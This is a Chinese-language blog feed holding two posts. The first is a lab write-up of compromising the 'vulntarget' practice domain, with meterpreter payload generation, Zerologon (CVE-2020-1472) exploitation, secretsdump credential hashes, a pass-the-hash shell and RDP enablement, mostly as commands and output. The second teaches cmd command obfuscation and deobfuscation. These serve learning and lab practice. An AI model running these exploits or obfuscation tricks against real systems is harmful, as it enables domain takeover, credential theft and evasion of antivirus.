<p>使用端口转发 右键win7beacon —&gt; pivoting —&gt; Listener … —&gt;</p>
<p><img src="/posts/3edb83f3/16.png" alt="截图"></p>
<p>然后保存后会在listeners中生成这个通过win7做代理的listner</p>
<p>然后去上马，但是上去就会被WinDef给杀掉….. 卡住了昂</p>
<br>

<h4 id="msf上线win2016"><a href="#msf上线win2016" class="headerlink" title="msf上线win2016"></a>msf上线win2016</h4><h5 id="反向马上线失败了"><a href="#反向马上线失败了" class="headerlink" title="反向马上线失败了"></a>反向马上线失败了</h5><p>这里ip为win7的内网IP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.20.98 lport=4444 -f exe &gt; sl.exe   </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.20.98:5555 via the meterpreter on session 2</span><br><span class="line">                                       </span><br></pre></td></tr></table></figure>

<p>然后卡住了</p>
<br>

<h5 id="使用正向马-成功上线"><a href="#使用正向马-成功上线" class="headerlink" title="使用正向马 成功上线"></a>使用正向马 成功上线</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ msfvenom -p windows/x64/meterpreter/bind_tcp lport=6666 -f exe &gt; 6666.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 496 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/bind_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set rhost 10.0.20.99</span><br><span class="line">rhost =&gt; 10.0.20.99</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 6666</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started bind TCP handler against 10.0.20.99:6666</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.0.20.99</span><br><span class="line">[*] Meterpreter session 3 opened (10.0.20.98:53533 -&gt; 10.0.20.99:6666) at 2022-03-22 05:46:01 -0400</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN2016</span><br><span class="line">OS              : Windows 2016+ (10.0 Build 14393).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : VULNTARGET</span><br><span class="line">Logged On Users : 4</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"></span><br><span class="line">ARP cache</span><br><span class="line">=========</span><br><span class="line"></span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    10.0.10.110      00:0c:29:be:1e:f6  12</span><br><span class="line">    10.0.10.255      ff:ff:ff:ff:ff:ff  12</span><br><span class="line">    10.0.20.98       00:0c:29:f6:6a:0f  9</span><br><span class="line">    10.0.20.255      ff:ff:ff:ff:ff:ff  9</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  9</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  12</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  9</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  12</span><br><span class="line">    239.255.255.250  00:00:00:00:00:00  1</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  9</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  12</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>现在已经得到域内ip段为 <code>10.0.10.0/24</code></p>
<p>然后定位域控</p>
<p><code>run post/windows/gather/enum_domain</code></p>
<p>得到域控为DC名 <code>win2019</code>  IP<code>10.0.10.110</code> 域名 <code>vulntarget</code></p>
<p><img src="/posts/3edb83f3/17.png" alt="截图"></p>
<br>

<p>再添加一个win2016的路由</p>
<p><code>meterpreter &gt; run post/multi/manage/autoroute </code></p>
<p><img src="/posts/3edb83f3/18.png" alt="截图"></p>
<br>

<h3 id="域控win2016"><a href="#域控win2016" class="headerlink" title="域控win2016"></a>域控win2016</h3><h4 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>这里为了节省时间就扫几个端口了 不然太慢了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains nmap -Pn -sT 10.0.10.110 -p6379,80,8080,445,139    148 ⨯ 1 ⚙</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-22 06:19 EDT</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:8080 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:139  ...  OK</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:80 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:6379 &lt;--socket error or timeout!</span><br><span class="line">Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</span><br><span class="line">Connect Scan Timing: About 100.00% done; ETC: 06:20 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 10.0.10.110</span><br><span class="line">Host is up (12s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">80/tcp   closed http</span><br><span class="line">139/tcp  open   netbios-ssn</span><br><span class="line">445/tcp  open   microsoft-ds</span><br><span class="line">6379/tcp closed redis</span><br><span class="line">8080/tcp closed http-proxy</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 45.54 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="CVE-2020-1472（置空密码"><a href="#CVE-2020-1472（置空密码" class="headerlink" title="CVE-2020-1472（置空密码)"></a>CVE-2020-1472（置空密码)</h4><p>没啥可以了利用的地方，然后看了下 其他师傅的文章</p>
<p>这里用到了 域内提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110     1 ⨯</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Performing authentication attempts...</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">===========================================================</span><br><span class="line">Target vulnerable, changing account password to empty string</span><br><span class="line"></span><br><span class="line">Result: 0</span><br><span class="line"></span><br><span class="line">Exploit complete!</span><br><span class="line">                                                                             </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后密码被置空了</p>
<h4 id="使用impactet"><a href="#使用impactet" class="headerlink" title="使用impactet"></a>使用impactet</h4><p>使用 <code>secretsdump.py</code> dump hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/impacket/impacket-0.9.24/examples]</span><br><span class="line">└─$ proxychains python3 secretsdump.py  vulntarget.com/WIN2019\$@10.0.10.110  -just-dc  -no-pass  </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a3dd8e4a352b346f110b587e1d1d1936:::</span><br><span class="line">vulntarget.com\win2016:1601:aad3b435b51404eeaad3b435b51404ee:dfc8d2bfa540a0a6e2248a82322e654e:::</span><br><span class="line">WIN2019$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WIN2016$:1602:aad3b435b51404eeaad3b435b51404ee:f835118efec7ef06133c3f228e69e554:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:70a1edb09dbb1b58f1644d43fa0b40623c014b690da2099f0fc3a8657f75a51d</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:04c435638a00755c0b8f12211d3e88a1</span><br><span class="line">Administrator:des-cbc-md5:dcc29476a789ec9e</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:f7a968745d4f201cbeb73f4b1ba588155cfd84ded34aaf24074a0cfe95067311</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:f401ac35dc1c6fa19b0780312408cded</span><br><span class="line">krbtgt:des-cbc-md5:10efae67c7026dbf</span><br><span class="line">vulntarget.com\win2016:aes256-cts-hmac-sha1-96:e4306bef342cd8215411f9fc38a063f5801c6ea588cc2fee531342928b882d61</span><br><span class="line">vulntarget.com\win2016:aes128-cts-hmac-sha1-96:6da7e9e046c4c61c3627a3276f5be855</span><br><span class="line">vulntarget.com\win2016:des-cbc-md5:6e2901311c32ae58</span><br><span class="line">WIN2019$:aes256-cts-hmac-sha1-96:092c877c3b20956347d535d91093bc1eb16b486b630ae2d99c0cf15da5db1390</span><br><span class="line">WIN2019$:aes128-cts-hmac-sha1-96:0dca147d2a216089c185d337cf643e25</span><br><span class="line">WIN2019$:des-cbc-md5:01c8894f541023bc</span><br><span class="line">WIN2016$:aes256-cts-hmac-sha1-96:f53f26ac32375f204b39a10dbe054714ac57f4ed1604e522db5b2ab51d719760</span><br><span class="line">WIN2016$:aes128-cts-hmac-sha1-96:1deb3de2d7567fd69e91c14c3dff8ce7</span><br><span class="line">WIN2016$:des-cbc-md5:c44cbff1e3153e85</span><br><span class="line">[*] Cleaning up... </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到administrator的hash值 <code>aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15</code> </p>
<p>使用 smbexec 通过administrator的hash连接cmd 拿到域控的cmd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/impacket/impacket-0.9.24/examples]</span><br><span class="line">└─$ proxychains python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 administrator@10.0.10.110  </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p><img src="/posts/3edb83f3/19.png" alt="截图"></p>
<br>

<p>破解hash 去得到域控的登录密码</p>
<p>得到密码为 Admin@666</p>
<br>

<h4 id="然后开启3389远程桌面"><a href="#然后开启3389远程桌面" class="headerlink" title="然后开启3389远程桌面"></a>然后开启3389远程桌面</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/3edb83f3/20.png" alt="截图"></p>
<br>

<p><code>proxychains rdesktop 10.0.10.110</code></p>
<br>

<p><img src="/posts/3edb83f3/21.png" alt="截图"></p>
<p>没连上…  根据报错查了下解决方法：<br>进入windows系统，在“远程桌面”中，将“仅允许使用网络级别身份验证的远程桌面的计算机连接（建议）”勾选去除即可。</p>
<p>貌似只有这样才能用rdesktop登录</p>
<p>然后找了另一种方法 下载<code>remmina</code> </p>
<p><code>sudo apt install remmina</code></p>
<p><img src="/posts/3edb83f3/22.png" alt="截图"></p>
<p>然后成功登录到域控的远程桌面</p>
<p><img src="/posts/3edb83f3/23.png" alt="截图"></p>
<br>

<p>这靶场从开始到现在 搞了快一天了 好多东西都忘记怎么用了，当然也学了些新东西 还是有些收获的。明天再回顾下，然后尝试下koadic </p>
]]></content>
  </entry>
  <entry>
    <title>cmd命令混淆</title>
    <url>/posts/bac18dc8/</url>
    <content><![CDATA[<p>现在杀软大都是底层防御，直接混淆cmd没啥用，这里的话主要是学一下思路</p>
<h3 id="CMD命令符号"><a href="#CMD命令符号" class="headerlink" title="CMD命令符号"></a>CMD命令符号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@:隐藏命令的回显。</span><br><span class="line">~:变量扩展或者扩展环境变量指定位置的字符串。</span><br><span class="line">%:引用环境变量或者单个%表示引用命令行参数。</span><br><span class="line">^:取消转义字符。</span><br><span class="line">&amp;:命令连接字符。</span><br><span class="line">： 管道符，将上一个命令的输出,作为下一个命令的输入。</span><br><span class="line">:： 标签符,接受goto命令所指向的标签。</span><br><span class="line">”“:界定符,使用带有空格的路径时用”“将路径括起来。</span><br><span class="line">/: 其后的字符是命令的功能开关。</span><br><span class="line">&gt;: 命令重定向符，输入在前，输出在后，覆盖之前的内容。</span><br><span class="line">&gt;&gt;: 命令重定向符。输入在前，输出在后，不覆盖之前的内容。</span><br><span class="line">&lt;:将后面文件的内容输出到前面。</span><br><span class="line">= :赋值符号,用于变量赋值。</span><br><span class="line">\ :当前路径所在的根路径。</span><br><span class="line">&amp;&amp; :连接两个命令,&amp;&amp;前的命令成功时,才执行&amp;&amp;后的命令。</span><br><span class="line"> 	：连接两个命令,	 	前的命令失败时,才执行	 	后的命令。</span><br><span class="line">$:findstr命令中表示一行的结束。</span><br><span class="line">``:for/f中表示它们所包含的内容当作命令行执行并分析它的输出。</span><br><span class="line">!: 延迟变量,使用!!将变量名扩起来表示对变量值的引用。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h3 id="大小写-特殊字符混淆"><a href="#大小写-特殊字符混淆" class="headerlink" title="大小写/特殊字符混淆"></a>大小写/特殊字符混淆</h3><p>cmd中大小写不敏感 可以大小写执行命令</p>
<p><img src="/posts/bac18dc8/1.png" alt="截图"></p>
<h3 id="特殊字符混淆"><a href="#特殊字符混淆" class="headerlink" title="特殊字符混淆"></a>特殊字符混淆</h3><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01 ^"></a>0x01 ^</h4><p><code>^</code>是cmd中常见的转义字符 不会影响命令的正常执行。</p>
<p><img src="/posts/bac18dc8/2.png" alt="截图"></p>
<h4 id="0x02-“”拼接"><a href="#0x02-“”拼接" class="headerlink" title="0x02 “”拼接"></a>0x02 “”拼接</h4><p><img src="/posts/bac18dc8/3.png" alt="截图"></p>
<h4 id="0x03-替换空格"><a href="#0x03-替换空格" class="headerlink" title="0x03  , ;替换空格"></a>0x03  , ;替换空格</h4><p><img src="/posts/bac18dc8/4.png" alt="截图"></p>
<p>但是这个插入<code>net user</code>不会成功</p>
<h4 id="0x04-（）"><a href="#0x04-（）" class="headerlink" title="0x04 （）"></a>0x04 （）</h4><p><img src="/posts/bac18dc8/5.png" alt="截图"></p>
<br>

<br>

<h3 id="利用环境变量混淆"><a href="#利用环境变量混淆" class="headerlink" title="利用环境变量混淆"></a>利用环境变量混淆</h3><h4 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h4><p>在cmd下使用<code>set</code> 可以列举出cmd中的所有环境变量 一般使用<code>set a=who</code>这种的都是临时变量 重启后便不会存在  一般使用call命令来调用拓展变量</p>
<p><img src="/posts/bac18dc8/6.png" alt="截图"></p>
<p>（<code>cmd /c &quot;string&quot; 表示执行字符串string执行的命令 然后终止</code>  可以通过 <code>cmd /?</code> 查看cmd下的详细命令）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\TEST&gt;cmd /c &quot;set var1=ser&amp;&amp;set var2=ne&amp;&amp;set var3=t u&amp;&amp;call  %var2%%var3</span><br><span class="line">%%var1%&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bac18dc8/7.png" alt="截图"></p>
<br>

<h5 id="记一个小坑"><a href="#记一个小坑" class="headerlink" title="记一个小坑"></a>记一个小坑</h5><p>记一个小坑<br><code>set t=&quot;am&quot; &amp;&amp; who%t%i  </code> 多次执行只成功一次 不知道为什么..后续再运行 命令都失败了<br>直接<code>echo %t%</code>  得到为 <code>&quot;am&quot;</code><br><img src="/posts/bac18dc8/8.png" alt="截图"></p>
<p>尝试了下 发现这里可以不用去加双引号空格这类的 不然会被分隔开 但是第一次能执行也不知道是为啥，但是后面使用<code>call</code> 便可以执行环境变量的命令</p>
<h4 id="0x02-cmd-V-ON-启用延迟环境变量拓展"><a href="#0x02-cmd-V-ON-启用延迟环境变量拓展" class="headerlink" title="0x02 cmd /V:ON 启用延迟环境变量拓展"></a>0x02 cmd /V:ON 启用延迟环境变量拓展</h4><p>当启用 <code>/V：ON</code> 后 使用 <code>%var% </code>或 <code>!var! </code>来扩展变量，<code>!var!</code>可以用来代替<code>%var%</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd /c &quot;set var1=ser&amp;&amp;set var2=ne&amp;&amp;set var3=t u&amp;&amp;call  %var2%%var3</span><br><span class="line">%%var1%&quot;</span><br><span class="line">cmd /V:ON /c &quot;set var1=ser&amp;&amp;set var2=ne&amp;&amp;set var3=t u&amp;&amp;call  !var2</span><br><span class="line">!!var3!!var1!</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bac18dc8/9.png" alt="截图"></p>
<h4 id="0x03-通过截取环境变量"><a href="#0x03-通过截取环境变量" class="headerlink" title="0x03 通过截取环境变量"></a>0x03 通过截取环境变量</h4><p>通过<code>set </code> 查看当前的环境变量</p>
<p><code>%comspec%</code> 值的结果为 <code>C:\Windows\system32\cmd.exe</code> </p>
<p>可以通过截取后面部分去调用cmd 格式为<code>%VarName:~offset[,length]%</code> 然后就可以根据环境变量去拼接出想要执行的命令</p>
<p><img src="/posts/bac18dc8/10.png"></p>
<br>

<h3 id="使用for循环拼接命令"><a href="#使用for循环拼接命令" class="headerlink" title="使用for循环拼接命令"></a>使用for循环拼接命令</h3><p>cmd中除了set命令歪 还有 ftype、assoc等命令</p>
<p><code>assoc</code> 文件名拓展关联命令 </p>
<p><code>assoc /?</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">显示或修改文件扩展名关联</span><br><span class="line"></span><br><span class="line">ASSOC [.ext[=[fileType]]]</span><br><span class="line"></span><br><span class="line">  .ext      指定跟文件类型关联的文件扩展名</span><br><span class="line">  fileType  指定跟文件扩展名关联的文件类型</span><br><span class="line"></span><br><span class="line">键入 ASSOC 而不带参数，显示当前文件关联。如果只用文件扩展</span><br><span class="line">名调用 ASSOC，则显示那个文件扩展名的当前文件关联。如果不为</span><br><span class="line">文件类型指定任何参数，命令会删除文件扩展名的关联。</span><br></pre></td></tr></table></figure>

<p><code>ftype /?</code> </p>
<p>ftype：显示或修改用在文件扩展名关联中的文件类型，指定一种类型的文件默认用哪个程序运行或打开。命令格式为<code> ftype [fileType[=[openCommandString]]</code></p>
<p><img src="/posts/bac18dc8/f1.png" alt="截图"></p>
<br>

<p><code>for /?</code>  使用方法挺详细的 就是感觉有点不好理解…</p>
<p><img src="/posts/bac18dc8/f2.png" alt="截图"></p>
<p>for 循环在混淆时是一种较为复杂的方式通常会使用  /F 和 /L 参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR /L %variable IN (start,step,end) DO command [command-parameters]</span><br><span class="line"></span><br><span class="line">该集表示以增量形式从开始到结束的一个数字序列。因此，(1,1,5)将产生序列12345，(5,-1,1)将产生序列(54321)</span><br><span class="line"></span><br><span class="line">FOR /F [&quot;options&quot;] %variable IN (file-set) DO command [command-parameters]</span><br><span class="line">FOR /F [&quot;options&quot;] %variable IN (&quot;string&quot;) DO command [command-parameters]</span><br><span class="line">FOR /F [&quot;options&quot;] %variable IN (&#x27;command&#x27;) DO command [command-parameters]</span><br><span class="line"></span><br><span class="line">delims=xxx  用xxx进行分割字符串</span><br><span class="line">delims=f= 用f与= 进行分割字符串</span><br><span class="line">tokens=x,y,m-n </span><br><span class="line">tokens=2 选择分割后的第二段</span><br><span class="line">usebackq</span><br><span class="line"></span><br><span class="line">for /f &quot; delims=f= tokens=2&quot; %f IN ( &#x27;assoc .cmd&#x27; ) do %f</span><br><span class="line">assoc .cmd 返回结果为 .cmd=cmdfile</span><br><span class="line">delims=f= 会使用f和=进行分割  分成3部分 .cmd cmd file</span><br><span class="line">tokens=2  会选择第二部分 即cmd </span><br><span class="line">所以该命令执行后会去调用cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FOR /F &quot;usebackq delims==&quot; %i IN (`set`) DO @echo %i</span><br><span class="line">会枚举当前环境中的环境变量名称</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="利用混淆工具"><a href="#利用混淆工具" class="headerlink" title="利用混淆工具"></a>利用混淆工具</h3><p><a href="https://github.com/danielbohannon/Invoke-DOSfuscation">https://github.com/danielbohannon/Invoke-DOSfuscation</a></p>
<p>需要powershell管理员权限下去运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted</span><br><span class="line">Import-Module .\Invoke-DOSfuscation.psd1</span><br><span class="line">Invoke-DOSfuscation</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>tutorial</code> 查看基本使用方法</li>
</ul>
<p><img src="/posts/bac18dc8/11.png" alt="截图"></p>
<ul>
<li>Set command [需要混淆的命令]  //设置需要混淆的命令   </li>
</ul>
<p><img src="/posts/bac18dc8/12.png" alt="截图"></p>
<ul>
<li>Set FINALBINARY [命令运行的环境]  //设置命令运行的环境</li>
</ul>
<p><img src="/posts/bac18dc8/13.png" alt="截图"></p>
<ul>
<li>payload  //加载混淆模块</li>
</ul>
<p><img src="/posts/bac18dc8/14.png" alt="截图"></p>
<ul>
<li><p>show //查看当前命令设置的参数详情</p>
<p><img src="/posts/bac18dc8/15.png"></p>
</li>
<li><p>test  //测试混淆后的命令</p>
</li>
</ul>
<br>

<h3 id="cmd命令去混淆"><a href="#cmd命令去混淆" class="headerlink" title="cmd命令去混淆"></a>cmd命令去混淆</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul>
<li>替换掉 ^ 转义字符</li>
<li>通过 = 和 % 的规则去查找混淆的变量</li>
<li>通过 set 查找混淆变量</li>
<li>通过 %:~m,n% 查找混淆变量</li>
<li>统一小写常用命令和程序名称</li>
</ul>
<h4 id="mmts"><a href="#mmts" class="headerlink" title="mmts"></a>mmts</h4><p>这里使用mmts简单试一下 项目地址 <a href="https://github.com/a232319779/mmts">https://github.com/a232319779/mmts</a></p>
<p>先通过反混淆工具生成一条命令 保存为1.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd /C&quot;set zUG=\System32\ ^^^| findstr calc\.exe&amp;&amp;set cF=:&amp;&amp;set szG=Windows&amp;&amp;set QK=\&amp;&amp;set HhO=dir&amp;&amp;set u6= C&amp;&amp;call set uQ=%HhO%%u6%%cF%%QK%%szG%%zUG%&amp;&amp;cmd /C %uQ%&quot;</span><br></pre></td></tr></table></figure>

<p>然后再mmts下 <code>mmts-decmd 1.txt</code></p>
<p><img src="/posts/bac18dc8/16.png" alt="截图"></p>
<p>再去生成一个复杂点的混淆 <code>whoami &amp;&amp; net user</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f^o^R  ;   ,    ;  ,  ;   ,   ,   /^F   ;   ;  ;  ;  &quot;      tokens=   +2       delims=H0lFu&quot;  ;   ,   ;   ,  ;  ;    %^V  ;   ;  ,   ,    ,  ^In    ,    ;  ;  ;  (   ,  ,    ,   ,    ;    ;   ,   &#x27;   ,  ;    ,  ,    ;    ,   ;  ^^f^^t^^Y^^P^^E  ;   ;  ;    ;   ^|    ;   ,   ;    ;  ^^f^^iN^^D   ;   ;    ,    ;    ;  ,  ,  &quot;Cm&quot;   ;  ,   ,  ,  ;    ,  &#x27;  ,   ;  ,   ;   )  ;  ,   ;   ;   ,   ^D^o   ;   ;  ,    %^V,     ;   ;  ;  ;  ,  ,   ;  9k467c^/^v^@^E^O^f^ ^ ^    ;  ;   ;    ;  kwp3a/^r       &quot;  ;  ;    ,   ,  ,  (       ,      ,    ,     ,     ,       (     ,    (^S^e^t ^  ^ ^*^_;=^~^R^-^j^z^ri^2^S^U^&amp;e_^y^6^a^&gt;^s^aY^6vh^u^Z^d^L^+N^ ^#^k^6`Ut^p ^4^c^H^e^,^jo^Y&#125;n^-^`^5^9^_^ ^1^Z^)^, ^&amp;^]^2^;^e^t^^?^eO^&amp;^#^&amp;^,^K^Y^BN^^3%^D^I^w^ 1^l^H^3P^i~^f^b%;^m^(^f^o^@^)a^g^&#123;^c^s^K^o^_C^&#123;^E^`^h^p^F^@^BAwp^Qd^B^?^ ^x^qs^zl^ ^Vq^&gt;^Y^j^|^f^&#123;^5S^Z^^O^)^6^?^\^ ^6^&lt;%^v^2\a^?^j^z^G^2^&amp;^W^S^9^a^3^`^*^&gt;v^w^mj~#^t^(^ea^T^h^_^6^t^aB^)^A^X^s^j^b^D^(^W^y^\^Al^:&#123;^s^C^b^\5^@^\^M^C^XN^?^s^J^M^P^[^x^w^S^4^UCy^o^I^9^&#123;^2^S^d^T^w^_^`^Xn^u^J^|r3^i~^x^&#123;^L^&amp;^w^[^r^vW^,^\^7^b^;^e^R^:^#^`=E^;^C^9^g^O^o~^ ^Z^v^&gt;^ ^A^r^Y^&#x27;^m^$^[^iZ^=^Bt^*^d) ; ; ; ; ) ; ; ; ; ; )&amp;       ;  ,    ;  ,   ,    ,  ;  ^f^o^R   ;   ;    ;    ;  ;  /^L   ,  ,   ;    %^j  ;   ,  ,    ^In    ;    ,   ;  ,  (^  ^ ^ ^ ^2^9^3^   ^ ^ ^,^ ^ ^ ^;^ ^ ^ ^ , ^    ^ ^ ^;^ ^  ^,^ ^ ^ ^   ^ ; ^ ^ ^ ^ ^  ^,^   ^ ^ ^-^6 ^ ^   ^ ^ ^,^    ^+5^ ^ ^ ^ ^ ^ 